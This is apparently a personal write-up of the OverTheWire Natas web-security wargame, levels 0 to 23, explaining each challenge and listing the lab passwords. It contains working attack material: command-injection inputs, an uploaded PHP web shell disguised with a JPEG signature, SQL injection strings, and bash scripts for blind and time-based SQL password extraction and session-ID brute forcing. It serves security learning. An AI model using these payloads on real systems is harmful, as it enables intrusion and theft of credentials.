# Natas Wargame

This repository tracks my progress through the Natas wargame by OverTheWire. Natas is focused on web security, covering a wide range of real-world web vulnerabilities including authentication bypasses, information disclosure, input manipulation, client/server-side logic flaws, and basic web exploitation techniques.

Each level is a hosted web page with a challenge that can be solved using tools like browser developer tools, curl, Burp Suite, and basic scripting. I’ll document each level with steps, explanations, and any payloads used. Some levels may be solved with hints or public write-ups, but I’ll always explain the solution in my own words.

## Level 0 → 1
We log in as `Natas0`, and the website says `"You can find the password for the next level on this page."`. We hit `F12` to open the developer tools, and in the `HTML` of the page we can see a `div`, inside it we find the next password.

Password: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

## Level 1 → 2
This time the website says the same thing, but right clicking is blocked. We do the same as previous level and get the password.

Password: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

## Level 2 → 3
The website says `There is nothing on this page`. But looking at the `HTML`, we notice this tag:
```html
<img src="files/pixel.png">
```
The `img` tag is used to display images, and `src` is the source of the image. We can see that it displays `pixel.png` which is in a directory called `files`. We try to go to the path `/files` in that website, like that:
```
http://natas2.natas.labs.overthewire.org/files/
```
It works and we can see some files, one of them is `users.txt`. Clicking on it shows it's content, which is usernames and their passwords, and one of them is `Natas3`.

Password: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

## Level 3 → 4
We log in, and the website says the same. But this time there's no `img` tag, there is a comment saying
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
This is a hint. In many websites, there is a file called `robots.txt` that tells Google's crawlers what parts of the websites they should crawl. So we visit the path `/robots.txt` and see this:
```
User-agent: *
Disallow: /s3cr3t/
```
It means that all crawlers should avoid the path `/s3cr3t/`. We go into that path, and find a file called `users.txt`, and inside it we find the next password.

Password: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

## Level 4 → 5
We log in and the website says `authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`. We don't have access to `Natas5` yet, so we need to trick the website into thinking that we were referred to this site from the specified address.

### `curl` command
`curl` (Client URL) is a CLI tool for transfering data by communicating web or application servers over popular network protocols, like `HTTP`, `HTTPS`, `FTP` and more. 

An HTTP request has the option to include information about which address referred it to the actual page. The `curl` command allows us to specify a referrer using the `-e` flag. Another useful flag is `-u` that let's us specify username and password for our request. We first use this command on our terminal:
```bash
curl -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```
But the response says `401 Unauthorized`, so we need to add the username and password.
```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```
Now we get access to the website, which gives us the next password.

Password: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

## Level 5 → 6
This time the website says `Access disallowed. You are not logged in`, which is weird because we just logged in.

### HTTP Cookies
`HTTP cookies` are small text file that websites store on the user's browser. They are mainly used by websites to remember information about the user in order to personalize and track activity and preferences. More importantly, they are used for login processes.

In our case, even though we logged in, the website doesn't recognize that we are logged in. To track if a user is logged in, websites use `HTTP cookies`, so that's what we should check. In the developer tools we can see the `storage` tab, and inside we can see the website's cookies. There is one cookie here, and it has a field called `loggedin`, which is set to `0`. We change it to `1` and refresh, and now the website knows we are logged in and the next password is revealed.

Password: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

## Level 6 → 7
This time we need to find a secret input. There is also a link to view the sourcecode, so we check it and we can see that function:
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

### PHP Language
`PHP` (Hypertext Preprocessor) is a scripting language that is very popular for server-side in websites. It allows developers to embed dynamic code within HTML.  When a user visits a PHP-enabled page, the server processes the PHP code and sends the resulting HTML output to the browser. PHP is widely used for creating dynamic websites, handling forms and connecting to databases. It is enclosed in `<?php ... ?>` tags (possible without `php`, like in our example), variables start with `$` and the content of forms sent by `POST` request can be used with the `$_POST` variable.

As we can see by the `<? ... ?>` tags, the above function is written in `PHP`. That's why by viewing the sourcecode in the developer tools, we can't see this function. 

Inside the function, we can see the line `include "includes/secret.inc";`. It means that a file named `includes/secret.inc` exist. We want to check it out, so we go to the path `/includes/secret.inc` and view its source code, and there is a comment with the secret input. We go back and submit the secret code, and we get the next password.

Password: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

## Level 7 → 8
This time there are 2 links on the page, `Home` and `About`. By clicking on Home, it adds `?page=home` to the url and displays a text saying `this is the front page`. It does a similar thing with About.

### Path Traversal Attack
`Path traversal` attack is a security vulnerability of websites that allows the attacker to access files and directories outside the website's file system location. It is done by manipulating input paths on the website. When using unintended paths, like `../` or `/etc/` for example, the attacker can travel inside the directory hierarchy and access sensitive info, such as passwords, system data and configuration files that should be restricted. This can be avoided by validating the file related operations on the server.

When viewing the page's source code, there is a hint comment:
```HTML
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

So we want to use `Path traversal` to see the password on that path. As we've seen, the website uses `?page=` in order to view the content of `home` and `about`, that might be files in the server's directory. So by using the path:
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
We travel to the user's password file and get the next password.

Password: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

## Level 8 → 9
Similar to the previous level, we get a link to the source code and need to find a secret input. By looking at the source code, we can see the following `PHP` function:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
We can see that the secret code has been encoded, and we can see the encoding function. The encoding process uses 3 built-in `PHP` functions:
* `base64_encode` - encode strings with `base64`. 
* `strrev` - reverse a string.
* `bin2hex` - convert a string (`ASCII`) to hex values.

### Base64
`base64` transforms binary data into a sequence of printable characters. It is done by taking 6 bits at a time, and mapping them into one of 64 unique characters. Data being transformed into `base64` is taking about 33% more space in memory. `base64` is used to transfer binary data across channels that only support text content. It is popular for sending email attachments, and also on the web, to embed images and binary assets inside text format files like `HTML` and `CSS`.

So now we have the encoded secret and the encoding process, we want to take the encoded secret and decode it by reversing the encoding process.

```bash
nano decode.php
```
In this file, we write the decoding function:
```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$secret = base64_decode(strrev(hex2bin($encodedSecret)));
print $secret;
?>
```
`hex2bin` does the opposite of `bin2hex`, and `base64_decode` is used to decode data that has been encoded using `bas64_encode`. So we reversed the encoding process and used it on the encoded secret that we found on the website's source code, in order to get the original secret.

```bash
php decode.php
```
We run our decoding program and get the input secret. After submitting it on the website, we get the next password.

Password: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

## Level 9 → 10
This time we have a search input and we once again can view the source code. By viewing it, we see this `PHP` function:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
We can see that if the search key isn't empty, the program uses `passthru()`, which is similar to `exec()`, used to execute scripts and programs on the system. The program uses `grep` in order to find the search keyword in a dictionary. We can manipulate the search input to make `grep` show the next password. 

### Command Injection Attack
A `Command injection` attack occurs when an attacker is able to execute system commands on a server by exploiting insecure user input handling. This typically happens when an application passes user input directly into a system command (with `exec()`, `system()`, shell calls, or like in our example, `passthru()`) without proper validation or sanitization. By injecting a well-crafted input, often using special characters like `;`, `&&`, or `|`, an attacker can run malicious commands on the system, potentially gaining unauthorized access, extracting data, or taking control of the system.

We use this input for the search:
```bash
"" /etc/natas\_webpass/natas10 \
```
The search key is not empty, so The program actually executes this command:
```bash
grep -i "" /etc/natas\_webpass/natas10 \ dictionary.txt
```
`grep -i ""` will accept any line in any file, because they all include `""`, which is an empty input. Then, we make it look inside `/etc/natas_webpass/natas10` instead of the dictionary file. By ending with `\`, we "break a line" and practically avoid searching in the dictionary file. By using this command, we manipulated the website's search input into running an unintended command and giving us the next password.

Password: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

## Level 10 → 11
This is similar to the previous level, but this time the website says `For security reasons, we now filter on certain characters`. We check out the source code and see this function:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The website is tring to protect itself from our last `Command injection` attack by not allowing the input to contain certain special characters. 

### Regular Expression
Regular expressions (regex) are patterns used to match and manipulate text. They are often written between forward slashes (`/.../`) which act as delimiters, marking the beginning and end of the expression. For example, `/cat/` will match the word "cat" in a string. `PHP` provides functions like `preg_match()` and `preg_replace()` to work with regular expressions. Within the pattern, special characters like `.` (any character), `*` (zero or more), or `^` (start of string) allow for powerful and flexible searching.

So by using the regular expression `'/[;|&]/'`, the website don't allow inputs that contain the characters `[;|&]`. The `/` in the expression only marks the beginning and end of the pattern, so in  our case it doesn't bother us, and similar to the previous level, we can use this input to get the next password.

```bash
"" /etc/natas\_webpass/natas11 \
```

Password: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

## Level 11 → 12
As we log in, there is an input field with hex color code, and it can be used to change the website's background color. It also says `Cookies are protected with XOR encryption`. There is also a link to view the source code, and inside we find this `PHP` function:
```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
It means that if we can change the cookie so the field `showpassword` is set to `yes`, the page will show the next password. We also see in the source code another `PHP` code, I will not bring the full code. What happens there is that the server reads the cookie from the user (`$_COOKIE`) and decodes it, so it can know what color it should change the background to, and more importantly, if it should show the password. The data is being decoded in this line:
```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
```
We can use `json_encode()` and `base64_encode()` to reverse the decoding process of `json_decode()` and `base64_decode()`, but we cannot reverse the `xor_encript()`, because inside the function the key is censored.

### XOR Encryption
In `XOR encryption`, each character of the input is combined with a key using the XOR (`^`) operation. If we have both the original input and the encrypted output, we can recover the key because of the reversible nature of XOR:
```php
input_char ^ key = output_char
```
So, rearranging it:
```php
output_char ^ input_char = key
```
By XORing the known input and output, we can reveal the key used for each character.

### URL Encoding
`URL encoding`, also known as `Percent encoding`, converts characters into a format that can be transmitted over the internet. `URL encoding` is used to replace unsafe `ASCII` characters with a `%` followed by 2 hex digits. For example, web URLs cannot contain spaces, so spaces inside a URL is being replaced with the value `%20`. 

In our case, by looking the `data` in the cookie, we can see that it ends with `%3D`, which is the URL decode for `=`. When working with the data, we need to URL decode it, so we replace the end of the data with `=`.

So, can see the original data being XOR encrypted in the code (`array("showpassword"=>"no", "bgcolor"=>"#ffffff")`) and we have the output of the encryption (the `data` in our cookie), so we can xor them find the encryption key.

```php
<?php
$data = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
$originalData = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
print json_encode($originalData) ^ base64_decode($data);
?>
```
The output of this is `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`, so the key to the encryption is `eDWo`. Now that we know the encryption key, we can craft our own cookie data so that when the server encrypts it, `showpassword` field will be set to `"yes"`.

```php
<?php
$key = "eDWo";
$data = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$xorData = "";
for($i = 0; $i < strlen($data); $i++) {
        $xorData .= $data[$i] ^ $key[$i % strlen($key)];
}
$cookie = base64_encode($xorData);
print $cookie
?>
```
We clone the encryption process of the server, but manipulate the cookie `data` so `showpassword` will be set to `"yes"`. To test it, I first tried it on the original data, when `showpassword` is set to `"no"`, and i got the exact `data` in the cookie, so it works. We set the cookie `data` with the output of this function and refresh, and we got the next password.

Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

## Level 12 → 13
This time the page wants us to upload an `JPEG` image. Looking at the given source code, we can see the `PHP` code for handling the uploaded file. The server gets the file and it's name, generates a random name for the file and saves it in a path that the user can access. What's interesting here is this function:
```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```
`$fn` is the file name given by the user. The server extract the extension of the file and creates the new file on the server with the same extension. It means that if we uploaded a file with `.jpg` extension, the extension of the file that the server creates will also be `.jpg`. But, if we upload a `.php` file, the file on the server also will be a `.php` file, and we will be able to run a `php` code.

```php
<?php
    print passthru("cat /etc/natas\_webpass/natas13");
?>
```
We created a file that runs a `php` code. It executes `cat` on the password file and prints it. But when we upload it from the website, the extension of the file being created is `.jpg`. Looking at the sourcecode again, we can see that line inside the upload form:
```php
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
This line prevents our file from being `.php`, all files being uploaded will end with `.jpg` because of that value. We need another way to upload the file.

```bash
curl -X POST -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB natas12.natas.labs.overthewire.org/index.php -F "filename=file.php" -F "uploadedfile=@file.php"
```
We use `curl` in order to upload the file, this way we control `"filename"` and not the website form. We use `-X POST` to set the request as `POST` and `-F` flag is used to replicate a form input value, `@` before the file name attaches that file to the request. In the response from the server, we see this line:
```html
The file <a href="upload/w0wsxduq4q.php">upload/w0wsxduq4q.php</a> has been uploaded
```
So the file successfully uploaded to the server with the `.php` extension as we wanted. When we visit the path `upload/w0wsxduq4q.php` the malicious code inside the file is executed and the password is printed.

Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

## Level 13 → 14
Similar to the last level, we need to upload an image to the website. This time it says: ` For security reasons, we now only accept image files!`, and looking at the sourcecode we can see that it is done by using `exif_imagetype()`. This function is a built-in `PHP` function that checks the header of it's input file and returns if it is an image file (and what type) or not.
```php
<?php
    print passthru("cat /etc/natas\_webpass/natas14");
?>
```
We create the file `file.php` similar to the previous level, but this file's header is not an image type. We need to create a new file to trick `exif_imagetype()`.

### File Signature
A `file signature` (AKA `magic numbers`) is a sequence of 2-bytes in the beginning of file, the header. It is used to identify the file type, so the systems knows how to handle them and also extra guarantee that the file is actually the type it is declared. For example, `zip` files start with the sequence `'\x50\x4B\x03\x04'` and `JPEG` files start with `'\xFF\xD8\xFF\xE0'`. For more magic numbers, visit [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

```bash
(echo -ne '\xFF\xD8\xFF\xE0'; cat file.php) > image.php
curl -X POST -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC natas13.natas.labs.overthewire.org/index.php -F"filename=image.php" -F "uploadedfile=@image.php"
```
By using this command we first put the `magic number` of a `JPEG` file inside our new file, and then put the rest of the malicious `PHP` code from `file.php` inside. `exif_imagetype()` checks for the file's signature, so by putting the signature of `JPEG` files we can trick it. Then we send our `POST` request, similar to previous level, and get this in the response:
```html
The file <a href="upload/al6r6jmwih.php">upload/al6r6jmwih.php</a> has been uploaded
```
And by checking the `/upload/al6r6jmwih.php` path we find the next password.

Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

## Level 14 → 15
As we log in, the website asks for username and password (aside from the initial login to `Natas14`). Looking at the given sourcecode, we can see an `SQL query`.

### SQL Injection
`SQL Injection` is a type of security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It happens when user input is improperly filtered or escaped, allowing attackers to inject malicious SQL code. This can lead to unauthorized access to data, bypassing authentication, or even full control over the database. For example, if a web application directly includes user input in an `SQL` query without validation, an attacker might be able to manipulate the query to return all users’ data or delete tables.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
...
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored><br>";
```
These parts of the code are important to us. First, we can see the query the server sends to the database, getting all of the users that have the input user and also the user password. Then, it checks if there's at least 1 `line` that was found in the query, and if there is, the login proccess is complete and the password is given. Therefore, if want to manipulate the query to have at least 1 line.

This time it is a simple `SQL` injection. We insert the following input in the `username` field:
```bash
" or "1"="1" -- 
```
By submitting, the server gets our input and doesn't "sanitize" (check) it, so `$query` becomes this:
```php
$query = "SELECT * from users where username="" or "1"="1" -- " and password=\"".$_REQUEST["password"]."\"";
```
So, the query gets all the line where `username=""`, which is probably none, or `"1"="1"`, which is always true. Because it's a `or`, all lines return true to that condition and included in `$query`. Everything after the `--` is now a "comment" and doesnt matter. So all lines from `users` table get selected by `$query`, then we have at least one line and the login is successful.

Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

## Level 15 → 16
There is one input for username, and the page checks if it exists. After trying some inputs, we get that the username `natas16` exists. Now we want to find it's password, but the only response we get from the server is either the user exists or it doesn't, so a simple `SQL Injection` will not work here, as we don't get the query response. 

### Blind SQL Injection
A `blind SQL injection` happens when a web application is vulnerable to SQL injection, but the results of the injected query are not directly visible in the page’s response. Instead of seeing data, the attacker must infer information based on how the application behaves, such as different page content, error messages, redirects, or response times. For example, an attacker might send a query that causes a delay only if a condition is true (like `...AND IF(password LIKE 'a%', SLEEP(5), 0)`), and measure the response time to deduce the password char by char. This makes `blind SQL injection` slower and more difficult, but still powerful for extracting sensitive data.

The database table has `username` and `password` fields for each user. We will find `Natas16`'s password char by char by using some `SQL` features:
* `LIKE` - that operator lets us search a field not by static value, but with a template. It compares char by char instead of full strings.
* `%` - When using `LIKE`, `%` acts like a "wild card", for example `%a` fits all values ending with an 'a'.
* `BINARY` - that operator lets us compare by binary value, important for case sensitivity.

We can see the query in the page source code:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
Notice that the value comes from `$_REQUEST`, which can be either `GET`, `POST` or a cookie. We want to use injection to make it look like this:
```sql
SELECT * from users where username="natas16" and password LIKE BINARY "<prefix>%"
```
This way, we can brute force over the optional chars, adding everytime a char to the prefix. If we added a char and it's a currect prefix, the server will respond that this user exists. Then we add it to the prefix and try to guess the next char, until we have all 32 chars of the password. As explained, this is a type of `blind SQL injection`.

```bash
#!/bin/bash
url="http://natas15.natas.labs.overthewire.org"
credentials="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
prefix=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while [ ${#prefix} -lt 32 ]; do
	for char in $(echo $chars | fold -w1); do
		pref="${prefix}${char}";

		response=$(curl -s -u $credentials "$url?username=natas16\"+and+password+LIKE+BINARY+\"$pref%");

		if echo "$response" | grep -q "exists"; then
			prefix=$pref
			echo "Current: $prefix"
			break
		fi
	done
done
echo $prefix
```
We run this code and get the next password.

Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

## Level 16 → 17
Similar to [level 9](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-9--10), we have an input and the website searches it inside `dictionary.txt` using `grep`. But this time, the input is being checked, not allowing certain symbols (```[;|&`\'"]```), and also being placed inside quotes (`"<input>"`) so getting the password is harder. Since `"` is banned by the server we need to use another technique, and luckily `$()` are not banned.

Similar to the previous level, we will try to get the password char by char by using `blind SQL injection`. We can use `$()` to execute commands inside the `grep` parameter, and it's output will be the search input. For example, if we use `$(whoami)`, the search input will be `natas17`. In our case, we will use another `grep`, and it's output will be the input of the server's `grep`.

First, we will test an input that the password cannot contain.
```bash
$(grep $$$ /etc/natas_webpass/natas17)
```
The website returns everything inside `dictionary.exe`, and this is because the output of that command is empty, so every line returns true for the server's `grep`. Next, we will try some legitimate chars that can appear inside the password file.
```bash
$(grep a /etc/natas_webpass/natas17)
$(grep b /etc/natas_webpass/natas17)
```
The first input `a` gives a response similar to `$$$`, so there is no `a` in the password. on the other hand, `b` gives an empty response, so we know that there is a `b` in the password.

```bash
#!/bin/bash
url="http://natas16.natas.labs.overthewire.org"
credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
passChars=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for char in $(echo $chars | fold -w1); do
	response=$(curl -s -u $credentials "$url?needle=\$(grep+$char+/etc/natas_webpass/natas17)&submit=Search");

	if ! echo "$response" | grep -q "April"; then
		passChars=$passChars$char
	fi
done
echo $passChars
```
We go over all the options and we find that the password only contain these chars `bhjkoqsvwCEFHJLNOT05789`, but we do not know the order. We will do something similar to the previous level.
```bash
#!/bin/bash
url="http://natas16.natas.labs.overthewire.org"
credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
pass=""
chars="bhjkoqsvwCEFHJLNOT05789"

while true; do
	counter=0
	for char in $(echo $chars | fold -w1); do
		response=$(curl -s -u $credentials "$url?needle=\$(grep+$pass$char+/etc/natas_webpass/natas17)&submit=Search");

		if ! echo "$response" | grep -q "April"; then
			pass=$pass$char
			echo "found $char"
			counter=35
		fi
		((counter++))
	done
	if [ $counter -eq ${#chars} ]; then
		break
	fi
done
echo $pass
```
This time, we start with `b` and then try to append each char after it. If the sequence `b<char>` is not a part of the password we will get the dictionary content, otherwise it is part of the password and we can add it and try another char. So at the end, we will have `b<rest of the password>`, which is the right part of the password where `b` is the separator.

We get the output `bo7LFNb8vwhHb9s75hokh5TF0OC`. Now to find the left part, we will do the same but trying to add each char to the left of this output. I will not bring that code as it is very similar, but at the end we get the full password.

Password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

## Level 17 → 18
This level is exactly the same as [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but this time the responses from the server are in a comment, so we do not get any feedback at all. We need to use a more complicated type of `blind SQL injection`, where our only response from the server is timing (how long it takes to get a resonse). We first want to find the target username. 

### Burp Suite
`Burp Suite` (or just `Burp`) is a powerful web vulnerability testing tool used by security professionals and ethical hackers to find and exploit weaknesses in web applications. It acts as an intercepting proxy between your browser and the target application, allowing you to inspect, modify, and replay `HTTP/S` requests and responses. `Burp Suite` includes various tools such as `Repeater` for manual testing, `Intruder` for automated attacks like brute-force or fuzzing, and `Scanner` (in the Pro version) for automated vulnerability detection. It's especially popular for tasks like testing login forms, detecting SQL injection, XSS, and other web-based exploits.

Assuming the target user is `natas18`, I intercepted a request and used the `Repeater` on `Burp` with the following input in a `POST` request body.
```sql
username=natas18" AND SLEEP(5) #
```
`Burp` automatically used `URL encoding` on that input. What happens here is only if `natas18` exists, then the query will try the right part of the `AND` and will execute `SLEEP(5)`. And indeed, by using this input the response from the server takes more than 5 seconds, while on other usernames it takes less than 1.

Now we know the username and that `time-based blind SQL injection` can be done in this case. To reveal the password, we will use the same technique as in [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but with response time and not response content.

```bash
#!/bin/bash
url="http://natas17.natas.labs.overthewire.org"
credentials="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
prefix=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while [ ${#prefix} -lt 32 ]; do
	for char in $(echo $chars | fold -w1); do
		pref="${prefix}${char}";
		start=$(date +%s)

		response=$(curl -X POST -s -u $credentials -d "username=natas18\"+AND+IF(password+LIKE+BINARY+'$pref%', SLEEP(4),0) OR username=\" #" $url);
		
		if [ $(($(date +%s) - $start)) -ge 4 ]; then
			prefix=$pref
			echo "Current: $prefix"
		fi
	done
done
echo $prefix
```
We inject this value:
```sql
username=natas18" AND IF(password LIKE BINARY '$pref%', SLEEP(4),0) OR username=" #
```
`OR username="` is used to "close" the quotes that the server used. We check the response time from the server, and if it is greater that 4 seconds then we got a match, and we move to the next char.

Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

## Level 18 → 19
The website asks for an admin user login in order to give the next password. Looking at the source code, we can see that the website is using a `PHP session` to login.

### PHP Session Hijacking Attack
A `PHP session hijacking attack` occurs when an attacker steals a victim's session ID (usually stored in a cookie) and uses it to impersonate the victim on a web application. Since PHP uses session IDs to identify logged-in users, obtaining a valid session ID lets the attacker bypass authentication without needing a password. This can happen through insecure cookie handling, `XSS` (cross-site scripting), or sniffing network traffic over unencrypted connections. Once the attacker sets the stolen session ID in their browser or HTTP requests, they gain access to the victim’s account as if they were legitimately logged in.

We can see in the source code that the `PHP session ID` is just a number between 1 and 640. So we can brute force over all the session IDs and hopefully one of them is an active session of an admin.
```bash
#!/bin/bash
url="http://natas18.natas.labs.overthewire.org"
credentials="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

for i in {1..640}; do
	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$i" $url);
	
	echo "$i: $(echo $response | grep "Password")"
done
```
We start scanning the `PHP session` IDs from 1, and by the 119th ID we get an admin access and the username (`natas19`) and password are revealed.

Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

## Level 19 → 20
This level is similar to the previous level, but session IDs are not sequental. We need to understand how the session IDs are given, so we first get our own by sending `username` as `admin` with a random password. We get the ID `3132382d61646d696e`, which looks like a hex value. We should get more values to try and find a pattern.
```
3332322d61646d696e
3332362d61646d696e
3231332d61646d696e
```
We can see a clear pattern, where the first 3 bytes are between 30 and 39 and the rest is `2d61646d696e`. If we decode it as `URL encoding`, we find out the pattern; It contains random 3 digits, then a separator `-` and then the username. for example, `3132382d61646d696e` is `128-admin`.

```bash
#!/bin/bash
url="http://natas19.natas.labs.overthewire.org"
credentials="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

for i in {1..640}; do
	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$(echo -n "$i" | od -An -tx1 | tr -d ' \n')2d61646d696e" $url);

	if ! echo "$response" | grep -q "regular"; then
		echo "$i$j$k: $response"
	fi
done
```
Explaining this line ```bash (echo -n "$i" | od -An -tx1 | tr -d ' \n') ```:
* ```bash echo -n "$i" ``` - prints the number, `-n` prevents a new line.
* ```bash od -An -tx1 ``` -  dumps the input as hex bytes, `-An` removes the address.
* ```bash tr -d ' \n' ``` - removes spaces and new line.

Brute forcing worked, the right combination was `281-admin`, which is `3238312d61646d696e` encoded. We can see that using `URL encoding` is as safe (or not safe) as using plain text.

Password: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

## Level 20 → 21
We get an input that supposedly changes the user's `name`. Looking inside the source code, we can see some interesting things that might help. First, we can see how `admin` gets his access:
```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
```
It means that if `$_SESSION` has a key named `admin` and it's set to `1`, then admin access is granted. The other 2 methods that are interesting are `myread()` and `mywrite()`, as they are used to handle sessions' data manually by the developers, which is usually a bad idea and an opportunity to find bugs.

`mywrite()` creates a file dedicated to the session and saves the data inside. We can see that `ksort()` is used to sort the session keys, and the writing to the file happens in a loop for each key, which is odd because the only session key we see is `name`. `myread()` checks if a file has been created for that session ID by `mywrite()`, and if it already did, it reads the session keys from it and puts it in `$_SESSION` as a dictionary `key:value`. It is also using a loop to debug each key, although we only have one.

We can see that `mywrite()` adds the keys and values to the file by using a new line for each pair with a space between them (`key value\n`), and it stores the key `name` there, which is our input. So whe can use `Burp` to make a `POST` request, using any random session id we already have, and set the data to be `name=value\nadmin 1`, which is `value%0aadmin%201` in `URL encoding`. This way, `mywrite` will write our input to a file that looks like this:
```
name value
admin 1
```
Then, `myread()` will read it as 2 different keys, and because `$_SESSION` now has an `admin` key set to `1`, admin access is granted along with the password.

Password: `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`

## Level 21 → 22
This time we have 2 pages on the website. Looking at the first page's source code, we can see that the password is granted if `$_SESSION` has an `admin` key set to `1`. On the other page, we have a form. Inside it's source code we can see that function:
```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```
So every parameter sent by the request is stored in `_SESSION`. Using `Burp`, we simply capture the `POST` request that is being sent by the form page, adding `admin=1` to the parameters and sending. Now we take the session ID from the response, and add it to a `GET` request for the first page. Because of the funcion above, we added `admin=1` to `_SESSION`, and the password is revealed.

Password: `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`

## Level 22 → 23
We get an empty page, only a link to the source code. Looking inside, the password is revealed only if the `GET` request has a parameter `revelio`. But there is also this part:
```php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
```
The idea is that anyone who is not an admin is being redirected to the normal homepage without seeing the password. This is a bad idea, because there are many ways to avoid `redirection`. I used `Burp` to sent a `GET` request with a parameter `revelio`, and i got 2 responses. The first response had `302 Found` status code, and contained the page before being redirected, so i could see the password. The second one had `200 OK`, and was the redirection to the blank page. On a normal browser, the browser would automatically redirect us to the homepage, and we will not have a chance to see the password. But when using other tools instead of the browser, like `Burp` or `curl`, we can avoid redirections and see all of the responses.

Password: `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`

## Level 23 → 24
We have an input for password. Looking at the source code we can see the following condition, that if satisfied reveals the password.
```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
```
